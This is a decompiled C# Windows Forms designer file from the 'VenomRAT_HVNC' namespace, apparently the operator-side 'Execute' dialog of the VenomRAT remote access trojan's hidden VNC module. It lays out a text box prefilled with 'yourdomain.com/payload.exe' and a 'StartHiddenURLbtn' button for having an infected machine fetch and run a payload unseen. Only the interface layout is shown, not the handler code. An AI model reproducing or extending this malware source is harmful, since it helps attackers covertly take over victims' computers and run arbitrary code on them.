namespace VenomRAT_HVNC.HVNC
{
	// Token: 0x0200001E RID: 30
	public partial class FrmURL : global::System.Windows.Forms.Form
	{
		// Token: 0x060000DA RID: 218 RVA: 0x0000A798 File Offset: 0x0000A798
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000DB RID: 219 RVA: 0x0000A7B8 File Offset: 0x0000A7B8
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.HVNC.FrmURL));
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.label18 = new global::System.Windows.Forms.Label();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.Urlbox = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.StartHiddenURLbtn = new global::Guna.UI2.WinForms.Guna2Button();
			this.guna2DragControl2 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.panel1.Controls.Add(this.pictureBox1);
			this.panel1.Controls.Add(this.label18);
			this.panel1.Controls.Add(this.guna2ControlBox1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.panel1.Location = new global::System.Drawing.Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(437, 40);
			this.panel1.TabIndex = 14;
			this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
			this.pictureBox1.Location = new global::System.Drawing.Point(6, 3);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(32, 30);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 145;
			this.pictureBox1.TabStop = false;
			this.label18.AutoSize = true;
			this.label18.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label18.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label18.Location = new global::System.Drawing.Point(44, 9);
			this.label18.Name = "label18";
			this.label18.Size = new global::System.Drawing.Size(67, 20);
			this.label18.TabIndex = 2;
			this.label18.Text = "Execute";
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(389, 4);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 33);
			this.guna2ControlBox1.TabIndex = 0;
			this.guna2DragControl1.TargetControl = this.panel1;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.AnimationType = global::Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_VER_NEGATIVE;
			this.guna2BorderlessForm1.BorderRadius = 1;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(58, 97, 128);
			this.guna2BorderlessForm1.ResizeForm = false;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(58, 97, 128);
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.Urlbox.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.Urlbox.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.Urlbox.DefaultText = "yourdomain.com/payload.exe";
			this.Urlbox.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.Urlbox.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.Urlbox.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.Urlbox.DisabledState.Parent = this.Urlbox;
			this.Urlbox.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.Urlbox.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.Urlbox.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.Urlbox.FocusedState.Parent = this.Urlbox;
			this.Urlbox.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Urlbox.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.Urlbox.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.Urlbox.HoverState.Parent = this.Urlbox;
			this.Urlbox.Location = new global::System.Drawing.Point(51, 76);
			this.Urlbox.Name = "Urlbox";
			this.Urlbox.PasswordChar = '\0';
			this.Urlbox.PlaceholderForeColor = global::System.Drawing.Color.White;
			this.Urlbox.PlaceholderText = "";
			this.Urlbox.SelectedText = "";
			this.Urlbox.SelectionStart = 26;
			this.Urlbox.ShadowDecoration.Parent = this.Urlbox;
			this.Urlbox.Size = new global::System.Drawing.Size(249, 26);
			this.Urlbox.TabIndex = 157;
			this.StartHiddenURLbtn.Animated = true;
			this.StartHiddenURLbtn.BorderColor = global::System.Drawing.Color.Maroon;
			this.StartHiddenURLbtn.BorderRadius = 1;
			this.StartHiddenURLbtn.CheckedState.Parent = this.StartHiddenURLbtn;
			this.StartHiddenURLbtn.CustomImages.Parent = this.StartHiddenURLbtn;
			this.StartHiddenURLbtn.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.StartHiddenURLbtn.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.StartHiddenURLbtn.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.StartHiddenURLbtn.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.StartHiddenURLbtn.DisabledState.Parent = this.StartHiddenURLbtn;
			this.StartHiddenURLbtn.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.StartHiddenURLbtn.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.StartHiddenURLbtn.ForeColor = global::System.Drawing.Color.White;
			this.StartHiddenURLbtn.HoverState.Parent = this.StartHiddenURLbtn;
			this.StartHiddenURLbtn.Location = new global::System.Drawing.Point(306, 76);
			this.StartHiddenURLbtn.Name = "StartHiddenURLbtn";
			this.StartHiddenURLbtn.ShadowDecoration.Parent = this.StartHiddenURLbtn;
			this.StartHiddenURLbtn.Size = new global::System.Drawing.Size(72, 26);
			this.StartHiddenURLbtn.TabIndex = 159;
			this.StartHiddenURLbtn.Text = "Execute";
			this.StartHiddenURLbtn.Click += new global::System.EventHandler(this.StartHiddenURLbtn_Click);
			this.guna2DragControl2.TargetControl = this.panel1;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			base.ClientSize = new global::System.Drawing.Size(437, 137);
			base.Controls.Add(this.StartHiddenURLbtn);
			base.Controls.Add(this.Urlbox);
			base.Controls.Add(this.panel1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.Name = "FrmURL";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "FrmURL";
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x04000095 RID: 149
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000096 RID: 150
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000097 RID: 151
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000098 RID: 152
		private global::System.Windows.Forms.Label label18;

		// Token: 0x04000099 RID: 153
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x0400009A RID: 154
		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		// Token: 0x0400009B RID: 155
		public global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x0400009C RID: 156
		public global::Guna.UI2.WinForms.Guna2TextBox Urlbox;

		// Token: 0x0400009D RID: 157
		private global::Guna.UI2.WinForms.Guna2Button StartHiddenURLbtn;

		// Token: 0x0400009E RID: 158
		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl2;
	}
}
